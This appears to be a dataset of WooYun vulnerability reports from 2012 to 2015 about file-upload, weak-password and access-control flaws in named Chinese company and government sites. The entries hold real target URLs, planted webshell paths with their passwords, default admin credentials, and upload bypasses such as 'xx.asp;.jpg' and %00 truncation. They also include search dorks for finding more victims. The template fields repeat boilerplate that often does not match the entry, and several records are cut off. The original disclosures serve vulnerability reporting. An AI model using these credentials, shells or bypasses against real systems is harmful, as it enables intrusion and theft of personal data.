---
### [wooyun-2012-06289] 多特知道任意文件上传
**厂商**: 多特 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 多特知道未上传未过滤脚本后缀而是验证文件头，上传的时候用burp截包修改后缀搞定。。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 后缀白名单
---

---
### [wooyun-2015-0147521] 富士康网站漏洞,后台成功gethell
**厂商**: 富士康科技集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://ser.foxconn.com/管理员帐号弱密码admin admin后台可任意上传文件，无任何限制,成功上传shell成功获得管理员权限.厂商记得删除掉shell。

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0120955] 多市交警敏感信息部门存在多个web后门程序
**厂商**: 某政府部门 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 密码 chopperhttp://hzjj.hzga.gov.cn/Web/Files/Bgxz/aspx_20150616195734.aspxhttp://bjjj.baoji.gov.cn/web/Files/Bgxz/aspx_20150616194928.aspx

**POC**: http://bjjj.baoji.gov.cn/Web/admin/文件访问权限http://bjjj.baoji.gov.cn/Web/admin/Bgxz/TableEdit.aspx 找到文件上传查看文件http://bjjj.baoji.gov.cn/Web/admin/Bgxz/TableList.aspx一句话木马上传同理得到密码 chopperhttp://hzjj.hzga.gov.cn/Web/Files/Bgxz/aspx_20150616195734.aspxhttp://bjjj.baoji.gov.cn/web/Files/Bgxz/aspx_20150616194

**绕过**: 直接利用

**修复**: 文件夹权限管理
---

---
### [wooyun-2014-067601] 中国科学院近代物理研究所上传漏洞
**厂商**: 中国科学院近代物理研究所 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、整理书签的时候发现了这个站，收藏他的初衷已经不记得了，但肯定有故事。2、看到是ASPX的脑海中闪现的第一个单词就是fckeditor,果然心诚则灵。http://swgk.impcas.ac.cn/fckeditor/editor/filemanager/connectors/test.html

**POC**: 里面的webshell已经一大堆了。话说喜欢用image.asp;.jpg的大牛，我们好像在哪见过。然后挂了很多的链。点到为止，就不去作死了。

**绕过**: 直接利用

**修复**: 运维大牛告诉我装安全狗~
---

---
### [wooyun-2015-091353] TCL某平台弱口令泄露上万订单信息(客户姓名,手机,地址等)
**厂商**: TCL官方网上商城 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登录地址:http://ktshop.tcl.com/web/tclkt/login.jsp帐号:t54728密码:123456上万订单信息泄露,上亿交易额,客户手机,地址,部分银行卡号等信息...可以审核付款信息,也就是等于变相免费冲值,修改订单信息...任意文件上传,没找到路径...

**POC**: 登录地址:http://ktshop.tcl.com/web/tclkt/login.jsp帐号:t54728密码:123456上万订单信息泄露,上亿交易额,客户手机,地址,部分银行卡号等信息...可以审核付款信息,也就是等于变相免费冲值,修改订单信息...任意文件上传,没找到路径...

**绕过**: 直接利用

**修复**: 亲,过滤...
---

---
### [wooyun-2015-096691] 韶关市档案信息网越权及上传漏洞
**厂商**: 广东韶关档案局 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 后台管理

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 认证采用了先载入，然后JS跳转的机制。提交内容也没有进行权限验证.禁用浏览器JS可直接访问后台页面。其中可直接传马的页面：http://sgdaj.shaoguan.gov.cn/photo_admin.asp其他越权页面：

**POC**: Shell地址：http://sgdaj.shaoguan.gov.cn/uploadimg/1.asp数据库(及备份)不少，还有ORACLE的连了下MSSQL:

**绕过**: 直接利用

**修复**: 后台页面进行权限认证
---

---
### [wooyun-2013-021078] 百合网的一个任意文件上传
**厂商**: 百合网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 形象照那

**POC**: http://photograph.baihe.com/photograph/tp//2013/04/01/D9850963BA8EFCFD814FFADD1FB32973.jsp!!!!

**绕过**: 直接利用

**修复**: !!
---

---
### [wooyun-2015-0120417] 某省科技大学VPN可进入
**厂商**: CCERT教育网应急响应组 | **年份**: 2015 | **类型**: 网络敏感信息泄漏

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 网络敏感信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络敏感信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度文库https://vpn.just.edu.cn/dana/home/index.cgiA30000 A30000 进行登录https://vpn.just.edu.cn/Teacher/Admin/,DanaInfo=192.168.11.53+TeacherManager.aspxadmin admin 进行登录https://vpn.just.edu.cn/jasinda/newteacher/,DanaInfo=192.168.11.52+index.jspa01788 a01788进登录也可以进行文件上传，并没尝试

**POC**: 百度文库https://vpn.just.edu.cn/dana/home/index.cgiA30000 A30000 进行登录https://vpn.just.edu.cn/Teacher/Admin/,DanaInfo=192.168.11.53+TeacherManager.aspxadmin admin 进行登录https://vpn.just.edu.cn/jasinda/newteacher/,DanaInfo=192.168.11.52+index.jspa01788 a01788进登录也可以进行文件上传，并没尝试

**绕过**: 直接利用

**修复**: 。。
---

---
### [wooyun-2013-037412] 联想在线咨询测试站点任意文件上传，影响同服的其他站点
**厂商**: 联想 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URL：http://219.142.122.150:81聊天窗口有个图片上传功能，仅仅是前段验证，很容突破上传。如图：同服有6、7个站点。数据库账户密码：而且全盘浏览，权限很大、没深入。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们的工程师很专业的、
---

---
### [wooyun-2013-034063] 海尔集团之12某系统任意文件上传导致两个系统沦陷
**厂商**: 海尔集团 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题系统：http://www.itophome.com/海尔e家联盟被波及系统：同服站点http://marketing.haieruhome.com/海尔终端执行力系统安全，不是指你强大的在哪里，而是说你薄弱的地方在哪里。http://marketing.haieruhome.com/wooyun.txthttp://www.itophome.com/uploadfiles/1.aspxhttp://www.itophome.com/uploadfiles/ht.aspx这三个文件请删除。http://www.itophome.com存在fck编辑器上传漏洞。<form id="frmUpload" method="post" target="_blank" enctype="multipart/form-data" action="http://www.itophome.com/fc

**POC**: 见详细说明。http://marketing.haieruhome.com/wooyun.txthttp://www.itophome.com/uploadfiles/1.aspxhttp://www.itophome.com/uploadfiles/ht.aspx

**绕过**: 直接利用

**修复**: 0x1：升级FCK的版本，做好安全措施。0x2：服务器目录权限设置不正确。0x3：源码备份不要在web目录！！！
---

---
### [wooyun-2012-06593] 土豆fckeditor在线编辑器上传漏洞
**厂商**: 土豆网 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 可上传文件！

**POC**: http://www.tudou.com/fckeditor/editor/fckeditor.html

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2014-060223] 哈尔滨工业大学国际合作处任意文件上传漏洞
**厂商**: 哈尔滨工业大学 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞：http://www.international.hit.edu.cn/test/上传图片马 xx.asp;.jpg上菜刀，搞定~

**POC**: 上面说完了

**绕过**: 直接利用

**修复**: 你们更专业，大学电脑教授的牛逼无法形容……
---

---
### [wooyun-2013-047467] EDayShop购物系统任意文件上传漏洞（后台上传）
**厂商**: EDayShop | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆了官方演示地址看了一下http://e.edayshop.com/xt/ys/EDSC006/admins/index.asp就发现了一个很熟悉的上传连接http://e.edayshop.com/xt/ys/EDSC006/admins/upload_flash.asp?formname=bd&editname=tp&uppath=../tp&filelx=jpg此处过滤不严，可修改uppath上传路径，通过1.asa%00截断，上传任意文件任意文件名。

**POC**: (见原文)

**绕过**: 截断攻击

**修复**: 过滤掉%00 ; asp cdx 等字符跟后缀吧
---

---
### [wooyun-2012-06704] 51javacms后台jsp文件上传漏洞
**厂商**: 51javacms | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 后台多处可上传jsp类型文件，无任何过滤。反编译过来的源码看还存在很多安全问题。

**POC**: 进入后台系统系统管理-->文章附件管理可上传jsp文件.官方居然也没有任何限制。直接上传shell得了个root。

**绕过**: 直接利用

**修复**: 虽然不用ssh速度方面很OK,但是到处都是拼凑SQL啥的能安全吗？SPRING(mvc3)+mybatis+
---

---
### [wooyun-2015-0104700] 禅道项目管理软件多个漏洞
**厂商**: 禅道 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、upgrade.php缺少权限验证，导致匿名用户可随意调用任意模块，造成任意代码写入。2、附件上传模块的黑名单过滤在windows环境下可被绕过，结合第一个漏洞，匿名用户可上传任意文件。

**POC**: 1、越权upgrade.php关键代码如下index.php相关代码如下可以看到upgrade.php在loadModule之前少了一行checkPriv，即无需权限验证即可调用模块。但上面还有一行判断，$_SERVER['HTTP_X_REQUESTED_WITH']如果为空并且两个版本号比较结果小于等于0，则跳转到index.php。测试发现，两个版本号比较结果始终等于0，那么，$_SERVER['HTTP_X_REQUESTED_WITH']是不是可控的呢？答案是肯定的，这个值从http头中获取。这样便跳过了if判断，直接加载模块。官方演示站也存在该问题，如下图所示：后台的模块编辑功能可

**绕过**: 过滤绕过

**修复**: 1、upgrade.php加上权限判断2、使用白名单
---

---
### [wooyun-2013-035064] 时光动态网站平台(Cicro 3e WS) 多处漏洞
**厂商**: 时光软件 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该平台存在漏洞有 文件写入、任意文件下载一下以益阳市政府门户网站作为案例讲解1、任意文件下载/servlet/DownLoad?filePath=WEB-INF/web.xml2、文件写入url: /servlet/com.cicro.cws.htmleditor.wordFileUploadpost数据filename=../../../jsp/test.jsp&filepath=/&file=上传文件16进制涉及政府网站太多太多 ，在google中搜索inurl:gov.cn/structure/ 一大溜一大溜

**POC**: 下载漏洞上传漏洞部分网站需要后台登录，如需登录可通过sql注入获取用户名和密码，sql注入漏洞省——————

**绕过**: 直接利用

**修复**: 限制目录跳转之类，你懂的
---

---
### [wooyun-2013-046100] 乐视网#某服务器弱口令及其他问题
**厂商**: 乐视网 | **年份**: 2013 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 乐视网的一个ftp服务器存在弱口令ftp://115.182.51.26/user：user大致翻阅了一下，泄露了一些日志文件另外还有一些小问题，顺便提一下某服务器phpinfo一枚http://115.182.51.44/phpinfo.php某系统2个备份文件泄露http://115.182.51.144:8000/uploadsys.php.bak文件上传的http://115.182.51.144:8000/login.php.bak

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 改密码，删除配置文件。
---

---
### [wooyun-2013-040515] 海尔某分站任意文件上传漏洞
**厂商**: 海尔集团 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://s.haier.com内部员工系统,开放注册,新建问卷,上传logo,未验证.whoamint authority\system

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-035574] 安信网络一个弱口令及敏感信息泄露
**厂商**: 安信网络 | **年份**: 2013 | **类型**: 账户体系控制不严

**元思考**: 触发信号: 上传功能

**洞察**: 账户体系控制不严防护不足，开发者信任前端输入

**测试流程**:
1. 识别账户体系控制不严相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: www.anxin.net/editor/upload.asp文件上传地址，提交隐藏了，不过应该有大神可以利用吧？www.anxin.net/%E5%8D%87%E7%BA%A7%E8%AF%B4%E6%98%8E.txt配置文件访问。可修改密码——已改回，我还准备等他申请域名给我用叻:-)

**POC**: ↑↑↑

**绕过**: 直接利用

**修复**: 弱口令？升级说明？上传入口？此次虽然影响不大，但安全意识还是要有的。
---

---
### [wooyun-2014-064920] 某政务服务中心系统通用任意文件上传（续）
**厂商**: Cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 根据U神的  WooYun-2014-53786个人测试的时候，虽然修复了，只能上传jpg图片了，但是用Burp抓包再修改成jsp格式的秒过。

**POC**: 然后打开Burp然后改包结果

**绕过**: 直接利用

**修复**: U神比我懂
---

---
### [wooyun-2014-088503] 某幼儿园系统编辑器影响多个政府网站
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: http://ncstlyy.jxedu.gov.cn/js/fckeditor/editor/dialog/fck_about.html编辑器版本过低构造上传html<form id="frmUpload" enctype="multipart/form-data"action="http://ncstlyy.jxedu.gov.cn/js/fckeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/php/upload.php?Type=Media" method="post">Uplo

**绕过**: 直接利用

**修复**: 升级编辑器
---

---
### [wooyun-2012-06067] 新浪某分站文件上传漏洞
**厂商**: 新浪 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 新浪招聘 http://career.sina.com.cn/ 设置个人简历时上传照片的地方，通过伪造文件名、文件头及content-type可上传任意文件。不过有点鸡肋，因为文件保存的服务器不是career.sina.com.cn 而是 cache.mars.sina.com.cn，这个cache看名字就能猜到可能是个专门的放静态文件的图床，我传了php、asp啥的上去也执行不了，asp aspx不支持，php应该是没权限执行脚本。 但这确实是上传漏洞……

**POC**: http://cache.mars.sina.com.cn/nd/career/200709job/201204/20120415045701pic96.phphttp://cache.mars.sina.com.cn/nd/career//200709job/201204/20120415052818pic84.asphttp://cache.mars.sina.com.cn/nd/career//200709job/201204/20120415052516pic61.aspxhttp://cache.mars.sina.com.cn/nd/career//200709job/201204

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-027820] 赛迪网某分站遍历目录加fck编辑器漏洞导致沦陷
**厂商**: 赛迪网 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 功能测试

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: FCK编辑器漏洞

**POC**: 检测txt：http://goldpen.ccidnet.com/goldpen/test.txt无破坏

**绕过**: 直接利用

**修复**: 既然已经做过FCK编辑器的安全处理，为何还不处理干净？嘿嘿
---

---
### [wooyun-2015-099195] UC某二级目录任意文件上传
**厂商**: UC Mobile | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bbs.uc.cn/kg/这里自定义图片，可以任意上传。

**POC**: 虽然没能成功执行php,但是任意文件传0.0

**绕过**: 直接利用

**修复**: 上次索要了地址，会给发礼物吗？
---

---
### [wooyun-2014-083964] 新点网上开评标系统存在默认账户密码+越权+任意文件上传
**厂商**: epoint.com.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 百度或者谷歌搜索：登录到新点网上开评标系统可以获取搜索引擎已经收录的案例20个左右，当然有些系统可能没有建设在互联网，也可能没有被搜索引擎爬取到。

**POC**: 案例：http://www.dfzbcg.gov.cn/epointbid_dfpb/问题1：默认账户密码(用户名:密码)<--------------------------------------------------------------------->jg:11111 开标监管（这个在我测试的多个系统中都存在，请审核员使用该账户测试）kb:11111 开标admin:11111开标管理员gzry：11111 工作人员and so on.登录系统可以默认查看到若干招投标项目<-------------------------------------------------------

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0132597] 上海人民企业集团某oa系统存在漏洞
**厂商**: 上海人民企业集团 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 500强！！！一句话http://**.**.**.**/defaultroothttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/information/2015080323244476070434708.jsp密码tom上传点http://**.**.**.**/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeigh

**POC**: 另外，http://**.**.**.**/news_view.asp?id=2211这是一个盲注SQL。因为不在同一服务器，就不作证明了。

**绕过**: 直接利用

**修复**: 不知道
---

---
### [wooyun-2014-083575] 某气象管理系统存在重装漏洞可直接重置管理员密码
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 前人漏洞WooYun: 某通用气象服务后台存在安全漏洞(任意文件上传可提权/越权访问/弱口令/LED大屏信息修改+电视控制)同一套系统技术支持：重庆沃尔德科技有限公司存在漏洞的文件是install.aspx，因为重装之后不会自动删除文件，导致可以任意重置管理员的密码

**POC**: 由于有的管理员密码已经被修改过了，所以先修改为其它密码然后再测试重置为了aaaaaaaa访问http://ybtv.artword323.com:8012/install.aspx点击安装，提示安装成功此时重新使用admin/123456登录访问汇总http://ybtv.artword323.com:8012/install.aspxhttp://tnantv.artword323.com:8012/install.aspxhttp://dztv.artword323.com:8012/install.aspxhttp://lptv.artword323.com:8012/install.a

**绕过**: 直接利用

**修复**: 自动删除页眉
---

---
### [wooyun-2014-062034] 厦门市湖里区科学技术局某文件管理系统弱口令+FCK编辑器上传漏洞
**厂商**: 厦门市湖里区科学技术局 | **年份**: 2014 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 奇怪的文件管理系统弱口令admin/admin，进入后可查看站点根目录下所有文件，浏览的时候发现了fck，顺带一起提交~~（求邀请码啊，我都提3个了，这次必须放大招了）奇怪的文件管理系统（亮点是有上传、编辑功能）http://www.xmhlkj.gov.cn/file/index.aspadmin/admin进来以后站点根目录下发现一只大马http://www.xmhlkj.gov.cn/z.aspxxlz0iza1看看这个网站的结构我找呀找呀web.config---里面有数据库配置，收藏发现目标fckhttp://www.xmhlkj.gov.cn/ManageModule/Info/fckeditor存在上传漏洞连sample都没删剩下就不用我说了吧，顺带说一句，该服务器已经被提权了隐藏帐号gui$提权的工具在（貌似是2批人）C:\wmpub\D:\HuLi\R4\Include\

**POC**: 菜刀--服务器权限很大数据库--库挺多的一句话地址http://www.xmhlkj.gov.cn/HLSciTechNets/UploadFiles/image/nihao.asp/33.jpg密码1，我只传了这个，呵呵，其它没有动

**绕过**: 直接利用

**修复**: 文件管理器改密码、换路径，最好删除掉该模块；fck：1、iis升级2、C盘下的安全软件貌似毫无用处该换了3、fck做权限验证并删除不必要的文件4、路径该换啦（这个好像是我害的..哈哈，求邀请码，我只想学习并以所学为网络安全做出贡献）
---

---
### [wooyun-2014-080901] 某政府网站编辑器漏洞导致可上传木马
**厂商**: 南阳农业信息网 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.nyagri.gov.cn/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/test.html编辑器漏洞导致可上传木马

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2014-074028] 广东省地质测绘院某内部系统泄露
**厂商**: 广东省地质测绘院 | **年份**: 2014 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://183.61.117.149:8080/ admin/admin直接进入，里面有发布公告等功能，以及文件上传功能，未授权不进行下一步上传文件测试

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-010280] 苏宁某站点服务器沦陷
**厂商**: 江苏苏宁易购电子商务有限公司 | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.站点是：http://campus.suning.com/snjyw/2.后台地址http://campus.suning.com/snjyw/login.jsp3.直接admin/admin登录网站后台4.查看账号管理发现存在20多为管理员，全是弱口令

**POC**: 1.后台的上传文件管理可以直接上传jsp后门2.菜刀连上，文件管理如下：3.数据库账号root，密码也是弱口令，真的得注意啊这些个细节问题4.应用也是root跑的，

**绕过**: 直接利用

**修复**: 态度决定一切
---

---
### [wooyun-2012-012022] anwsion问答系统存在任意文件上传重大漏洞
**厂商**: anwsion.com | **年份**: 2012 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 参数注入, 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本人只在topic话题下上传了，貌似头像上传那里也存在该问题（没测试）点击话题图像，就可以编辑上传图像了。使用火狐的TAMPER DATA插件，并打开开始截获。选择一个2bb.jpg（内涵php一句话的正常图片即可)该文件目录内还有一个2bb.php（留作备用)在tamaper data内修改数据，把2bb.JPG改成2bb.php即可就可以看到上传上去的php图片小马了，但是这个是经过处理的只要把url后面的100X100参数或者50x50参数去除，就可以得到一个没有经过处理的PHP小马了。

**POC**: 官方已经拿到shell了马儿地址http://wenda.anwsion.com/topic/%E7%BC%96%E8%BE%91%E5%99%A8http://wenda.anwsion.com/uploads/topic/20120911/134730998609.php密码cmd。读了下源代码，发现一点问题，可以讨论讨论，加我qq：114967639搞这个源码的初衷很简单，哥要用啊.....

**绕过**: 直接利用

**修复**: 不懂
---

---
### [wooyun-2013-025265] 时报金犊奖网fckeditor文件上传漏洞,大量用户信息可泄露
**厂商**: 金犊奖 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 本来是来看我同学的作品的，无意中发现，:-)通过上传任意php脚本干任意事情，友情通知，谢谢

**POC**: 呵呵，密码明文

**绕过**: 直接利用

**修复**: 百度一大截
---

---
### [wooyun-2014-061007] 某网站管理系统存在任意文件上传漏洞
**厂商**: 北京昆仑亿发科技发展有限公司 | **年份**: 2014 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 改管理系统为北京昆仑亿发科技发展有限公司的产品先拿官网演示一下http://www.eastfair.com/fair/admin/upProduct.aspasp文件上传成功抓包找路径  菜刀连之

**POC**: 看一下官网展示的客户案例均存在同样问题  可上传任意asp文件http://www.qgtjh.com/admin/upProduct.asphttp://www.musicchina-expo.com/admin/upProduct.asphttp://www.cgof.cn/admin/upProduct.asphttp://www.eastfair.com/fair/admin/upProduct.asp等等 google搜一下估计还有很多的

**绕过**: 直接利用

**修复**: 限制文件上传类型
---

---
### [wooyun-2015-0149224] 国航某系统存在任意文件上传漏洞
**厂商**: 中国国际航空股份有限公司 | **年份**: 2015 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://webcall.airchina.com.cn:9090/webstat/ucstarclient_webcall/client/ucallclient_1.jsp问题原因是由于fck配置不当造成的poc:POST http://webcall.airchina.com.cn:9090/FCKeditor/editor/filemanagerhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/simpleuploader?Type=File HTTP/1.1Host: webcall.airchina.com.cn:9090Connection: keep-aliveContent-Length: 189Cache-Control: max-age=0Accept: text/html,application/xhtml

**POC**: http://webcall.airchina.com.cn:9090/UserFiles/Image/is.jspf

**绕过**: 直接利用

**修复**: 正确配置fck
---

---
### [wooyun-2013-038503] 某GOV站点上传漏洞导致服务器其他GOV站可受影响（二）
**厂商**: cncert国家互联网应急中心 | **年份**: 2013 | **类型**: 文件上传导致任意代码执行

**元思考**: 触发信号: 上传功能

**洞察**: 文件上传导致任意代码执行防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件上传导致任意代码执行相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 嘉兴市秀洲区发展和改革局http://www.jxxzfgj.gov.cn/user/login.aspxNetcms oday上传漏洞点注册之后点击发表文章然后在站内信息那块， 给自己发送个站内信，附件里直接传马。读取IID信息发现存在其他gov站。。

